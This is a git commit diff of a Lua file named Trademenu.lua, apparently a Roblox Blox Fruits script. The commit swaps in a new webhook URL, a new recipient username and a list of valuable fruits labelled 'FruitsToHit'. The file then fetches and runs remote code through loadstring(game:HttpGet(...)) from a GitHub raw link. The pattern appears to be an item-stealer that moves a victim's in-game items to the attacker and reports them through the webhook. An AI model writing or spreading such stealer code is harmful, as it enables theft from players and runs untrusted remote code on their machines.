18fa9fccaf17a04c4cf9bd903bb47410094b9a30
SpIeedx <josemoreirasaldarriaga42@gmail.com>
2025-03-09 13:42:47 -0500

    Trademenu.lua

--- Trademenu.lua
+++ Trademenu.lua
@@ -1,5 +1,5 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=elJzOGRwaE83Y2E2ZzZLUTlGVWFrdzpjYUh1dFdzY3BWSktsRHpxQW5FcDVOSkEzN093b0paOG0tQXRfQ0NnMVRBYW52VW12M3JoV0Y2ZUV0dGZ6UThDbFBOMmxYME4yZHFVYUZhakswQm5XenUwNDVhT3g5Qi1MdzNPWmRQRG1qdHV0bFZHNFJCb21ZTTF3eU5vRnpyeExDX1VGTkJXZXVfQ1MzcjhxRnMzN2tfcGpuN0MyNm9nWUVjV0tFNXhBRVU"
-Usernames = {"Rip_Iindrax2000"}
-FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "T-Rex-T-Rex", "Mammoth-Mammoth", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=bDhXQjMwOVNoajhDaFprcm5PZDFMZzpiOUhEUm1zR25BZDNDVU1GbndQVGdIZDRIVUhoVzEwWXh5c3JvUWQxU2JNTjBtdVdFZXNERkhoRU5yOU5MWlhwR2kzWjFDTVBvSFpvYlJySXVLQnV2ZzdRYjkwNkNfZkhDeGQ5UmwxOV9kYldaWTc0aXhMcFlXM21nczhSVkpwS2djSTJyZy1Jb21YOUhSYzgxMHNBcWZNRE0ybFplaWNyNkdoQk9fWHQwYmM"
+Usernames = {"Giuseppe_A51"}
+FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
